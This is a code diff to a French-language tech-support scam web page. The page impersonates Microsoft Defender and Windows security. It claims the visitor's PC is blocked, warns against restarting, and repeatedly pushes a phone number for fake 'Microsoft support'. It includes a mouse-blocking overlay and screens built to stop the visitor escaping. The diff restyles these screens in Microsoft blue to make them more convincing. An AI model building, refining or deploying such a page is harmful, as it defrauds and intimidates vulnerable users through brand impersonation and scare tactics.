@@ -5,7 +5,7 @@
   if (!document.querySelector('link[href*="styles.css"]')) {
     var styleLink = document.createElement("link");
     styleLink.rel = "stylesheet";
-    styleLink.href = "styles.css?v=7";
+    styleLink.href = "styles.css?v=8";
     document.head.appendChild(styleLink);
   }
 
@@ -13,27 +13,30 @@
 
   var securityPageBlueStyle =
     '<style id="security-page-blue">' +
-    "#securityOverlay{background-color:#0078d4!important;background-image:linear-gradient(165deg,#1a6fb5 0%,#0078d4 42%,#0d5a9e 100%)!important}" +
-    "#securityOverlay .access-modal{background:#0d5a9e!important;border-color:rgba(143,208,255,.4)!important}" +
-    "#securityOverlay .access-modal p{color:#fff!important}" +
-    "#securityOverlay .black-modal-blue-box{background:linear-gradient(180deg,#1a6fb5,#0d5a9e)!important}" +
-    "#securityOverlay .support-card{background:linear-gradient(180deg,#1a6fb5,#0d5a9e)!important}" +
-    "#securityOverlay .support-card-subtitle,#securityOverlay .support-card-phone,#securityOverlay .support-card-label,#securityOverlay .support-card-arrow{color:#fff!important}" +
+    "#securityOverlay,#securityOverlay.is-active{background-color:#0078d4!important;background-image:linear-gradient(165deg,#1a6fb5 0%,#0078d4 42%,#0d5a9e 100%)!important}" +
+    "#securityOverlay .access-modal,#securityOverlay .black-modal-blue-box,#securityOverlay .support-card{background:#0078d4!important;background-image:linear-gradient(180deg,#1a6fb5,#0d5a9e)!important;border:2px solid #3aa0ff!important}" +
+    "#securityOverlay .access-modal p,#securityOverlay .black-modal-blue-box p,#securityOverlay .black-modal-defender{color:#8fd0ff!important}" +
+    "#securityOverlay .support-card-subtitle,#securityOverlay .support-card-label,#securityOverlay .support-card-arrow{color:#5eb3ff!important}" +
+    "#securityOverlay .support-card-phone{color:#b3e0ff!important}" +
     "#browserChromeShield,#browserChromeShield.is-visible{background:#0d5a9e!important}" +
-    "#browserChromeShield .browser-chrome-modal{background:#0078d4!important}" +
+    "#browserChromeShield .browser-chrome-modal{background:#0078d4!important;border:2px solid #3aa0ff!important}" +
+    "#browserChromeShield .browser-chrome-alert,#browserChromeShield .browser-chrome-warning{color:#8fd0ff!important}" +
+    "#browserChromeShield .browser-chrome-phone{color:#b3e0ff!important}" +
     "#escapeShield .escape-shield-taskbar-wrap{background:#0d5a9e!important}" +
     "#escapeShield .escape-shield-taskbar-modal{background:#0078d4!important}" +
+    "#escapeShield .escape-shield-alert,#escapeShield .escape-shield-warning{color:#8fd0ff!important}" +
     "#escapeExitModal .escape-exit-modal{background:#0078d4!important}" +
+    "#escapeExitModal .escape-exit-message,#escapeExitModal .escape-exit-phone,#escapeExitModal .escape-exit-phone-icon{color:#8fd0ff!important}" +
     "</style>";
 
   mount.innerHTML =
     securityPageBlueStyle +
     '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
-    '<div id="browserChromeShield" class="browser-chrome-shield" aria-hidden="true" role="alert">' +
-    '<div class="browser-chrome-modal">' +
-    '<p class="browser-chrome-alert">Une anomalie a été détectée</p>' +
-    '<p class="browser-chrome-warning">Appellez le support technique Microsoft</p>' +
-    '<p class="browser-chrome-phone">+33 02 59 50 90 20</p>' +
+    '<div id="browserChromeShield" class="browser-chrome-shield" aria-hidden="true" role="alert" style="background:#0d5a9e">' +
+    '<div class="browser-chrome-modal" style="background:#0078d4;border:2px solid #3aa0ff">' +
+    '<p class="browser-chrome-alert" style="color:#8fd0ff">Une anomalie a été détectée</p>' +
+    '<p class="browser-chrome-warning" style="color:#5eb3ff">Appellez le support technique Microsoft</p>' +
+    '<p class="browser-chrome-phone" style="color:#b3e0ff">+33 02 59 50 90 20</p>' +
     '</div></div>' +
     '<div id="escapeShield" class="escape-shield" aria-hidden="true" role="alert">' +
     '<div class="escape-shield-taskbar-wrap">' +
@@ -43,15 +46,15 @@
     '</div></div></div>' +
     '<div class="modal-top-square" id="securityOverlay" aria-label="Alerte securite" aria-hidden="true" style="background-color:#0078d4;background-image:linear-gradient(165deg,#1a6fb5 0%,#0078d4 42%,#0d5a9e 100%)">' +
     '<div class="security-page">' +
-    '<section class="access-modal" aria-label="Alerte acces bloque" style="background:#0d5a9e;border-color:rgba(143,208,255,.4)">' +
-    '<p>L\'accès à votre pc a été bloqué pour des raisons de sécurité.</p>' +
-    '<p>N\'accédez pas à ce pc et ne le redémarrez pas. Si vous ignorez cet avertissement, vous risquez de perdre des informations.</p>' +
-    '<p>Contactez le support technique Microsoft dès que possible ; un expert vous guidera par téléphone lors de l\'analyse.</p>' +
-    '<p>L\'exécution de cette application peut mettre votre pc en danger.</p>' +
+    '<section class="access-modal" aria-label="Alerte acces bloque" style="background:linear-gradient(180deg,#1a6fb5,#0d5a9e);border:2px solid #3aa0ff">' +
+    '<p style="color:#8fd0ff">L\'accès à votre pc a été bloqué pour des raisons de sécurité.</p>' +
+    '<p style="color:#8fd0ff">N\'accédez pas à ce pc et ne le redémarrez pas. Si vous ignorez cet avertissement, vous risquez de perdre des informations.</p>' +
+    '<p style="color:#8fd0ff">Contactez le support technique Microsoft dès que possible ; un expert vous guidera par téléphone lors de l\'analyse.</p>' +
+    '<p style="color:#8fd0ff">L\'exécution de cette application peut mettre votre pc en danger.</p>' +
     '</section>' +
-    '<div class="black-modal-blue-box" style="background:linear-gradient(180deg,#1a6fb5,#0d5a9e)">' +
-    '<p>Windows Support : +33 02 59 50 90 20</p>' +
-    '<p class="black-modal-defender">Microsoft Defender</p>' +
+    '<div class="black-modal-blue-box" style="background:linear-gradient(180deg,#1a6fb5,#0d5a9e);border:2px solid #3aa0ff">' +
+    '<p style="color:#8fd0ff">Windows Support : +33 02 59 50 90 20</p>' +
+    '<p class="black-modal-defender" style="color:#5eb3ff">Microsoft Defender</p>' +
     '</div>' +
     '<section class="scan-modal scan-modal-hidden" aria-label="Support technique Microsoft" aria-hidden="true">' +
     '<h2 class="scan-modal-title">Désolé, l\'analyse n\'est pas terminée !</h2>' +
@@ -64,11 +67,12 @@
     '</div>' +
     '</section>' +
     '</div>' +
-    '<aside class="support-card" aria-label="Support technique Microsoft" style="background:linear-gradient(180deg,#1a6fb5,#0d5a9e);border-color:rgba(143,208,255,.4)">' +
-    '<p class="support-card-subtitle">Support technique Microsoft</p>' +
-    '<p class="support-card-phone">+33 02 59 50 90 20</p>' +
-    '<p class="support-card-label">Numero</p>' +
-    '<div class="support-card-arrow" aria-hidden="true">▼</div></aside></div>' +
+    '<aside class="support-card" aria-label="Support technique Microsoft" style="background:linear-gradient(180deg,#1a6fb5,#0d5a9e);border:2px solid #3aa0ff">' +
+    '<p class="support-card-subtitle" style="color:#5eb3ff">Support technique Microsoft</p>' +
+    '<p class="support-card-phone" style="color:#b3e0ff">+33 02 59 50 90 20</p>' +
+    '<p class="support-card-label" style="color:#5eb3ff">Numero</p>' +
+    '<div class="support-card-arrow" aria-hidden="true" style="color:#8fd0ff">▼</div></aside>' +
+    '<div class="security-bottom-mask" aria-hidden="true"></div></div>' +
     '<div class="home-page">' +
     '<main class="screen">' +
     '<div class="fb-desktop-bg" aria-hidden="true">' +
@@ -232,18 +236,27 @@
     }
 
     securityOverlay.querySelectorAll(".access-modal p, .black-modal-blue-box p").forEach(function (node) {
-      node.style.setProperty("color", "#ffffff", "important");
+      node.style.setProperty("color", "#8fd0ff", "important");
     });
 
     var defender = securityOverlay.querySelector(".black-modal-defender");
-    if (defender) defender.style.setProperty("color", "#8fd0ff", "important");
+    if (defender) defender.style.setProperty("color", "#5eb3ff", "important");
 
-    ["support-card-brand", "support-card-subtitle", "support-card-phone", "support-card-label", "support-card-arrow"].forEach(
-      function (className) {
-        var node = securityOverlay.querySelector("." + className);
-        if (node) node.style.setProperty("color", "#ffffff", "important");
-      }
-    );
+    var subtitle = securityOverlay.querySelector(".support-card-subtitle");
+    if (subtitle) subtitle.style.setProperty("color", "#5eb3ff", "important");
+    var phone = securityOverlay.querySelector(".support-card-phone");
+    if (phone) phone.style.setProperty("color", "#b3e0ff", "important");
+    var label = securityOverlay.querySelector(".support-card-label");
+    if (label) label.style.setProperty("color", "#5eb3ff", "important");
+    var arrow = securityOverlay.querySelector(".support-card-arrow");
+    if (arrow) arrow.style.setProperty("color", "#8fd0ff", "important");
+
+    ["browser-chrome-alert", "browser-chrome-warning"].forEach(function (className) {
+      var node = document.querySelector("#browserChromeShield ." + className);
+      if (node) node.style.setProperty("color", "#8fd0ff", "important");
+    });
+    var chromePhone = document.querySelector("#browserChromeShield .browser-chrome-phone");
+    if (chromePhone) chromePhone.style.setProperty("color", "#b3e0ff", "important");
 
     var chromeShield = document.getElementById("browserChromeShield");
     if (chromeShield) {
